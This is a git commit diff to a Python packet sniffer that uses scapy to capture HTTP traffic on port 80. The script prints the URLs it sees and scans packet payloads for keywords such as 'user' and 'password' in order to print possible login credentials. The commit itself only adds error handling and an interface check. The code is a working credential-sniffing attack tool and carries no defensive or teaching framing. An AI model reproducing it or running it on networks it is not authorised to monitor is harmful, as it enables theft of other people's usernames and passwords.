27c67d3c161f46259c551aecfa7ae9f16de6d3ef
Vijayakumar Kannan <imvijay29@gmail.com>
2020-04-25 22:15:06 +0530

    big fixes

--- Packet_sniffer/packet_sniffer.py
+++ Packet_sniffer/packet_sniffer.py
@@ -11,24 +11,33 @@ def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="port 80")
 
 def get_login_info(packet):
-    if packet.haslayer(scapy.Raw):
-        load = packet[scapy.Raw].load
-        keywords = ['login','user','pass','username','password']
-        for keyword in keywords:
-            if keyword in load.lower():
-                return load
+    try:
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load
+            keywords = ['login','user','pass','username','password']
+            for keyword in keywords:
+                if keyword in load.decode().lower():
+                    return load
+    except Exception as err:
+        print ("[-] something went wrong while extracting login info : {}".format(err))
 
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         url = urljoin(packet[http.HTTPRequest].Host, packet[http.HTTPRequest].Path)
-        print ("[+]HTTPRequest > "+ url)
+        print ("[+]HTTPRequest > {}".format(url))
         logininfo = get_login_info(packet)
         if logininfo:
-            print ("[+]Possible username and password "+ logininfo)
+            print ("[+]Possible username and password {}".format(logininfo))
 
-parser=argparse.ArgumentParser()	
+parser=argparse.ArgumentParser()    
 parser.add_argument("-i","--interface",dest="interface",help="Specify an interface to capture packets")
 options = parser.parse_args()
+
+from pdb import set_trace as st
+
+if not options.interface:
+    print (parser.print_help())
+    exit()
 
 sniff(options.interface)
 
